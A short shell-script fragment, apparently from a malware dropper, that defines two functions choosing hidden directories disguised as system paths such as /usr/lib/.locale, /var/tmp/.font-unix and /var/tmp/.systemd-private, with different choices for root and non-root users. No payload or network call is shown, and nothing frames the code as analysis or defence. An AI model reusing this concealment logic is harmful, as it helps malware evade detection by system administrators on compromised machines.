...
pick1(){ if [ "$(id -u)" = 0 ];then for b in /usr/lib/.locale /usr/share/.locale /var/lib/.uuid;do trymk "$b"&&return;done;fi;for b in /var/tmp/.font-unix /dev/shm/.u /var/tmp/.d1 "$HOME/.d1";do trymk "$b"&&return;done; }
pick2(){ if [ "$(id -u)" = 0 ];then for b in /var/cache/.index /var/spool/.queue /usr/libexec/.cache;do trymk "$b"&&return;done;fi;for b in /var/tmp/.systemd-private /dev/shm/.i /var/tmp/.d2 "$HOME/.d2";do trymk "$b"&&return;done; }
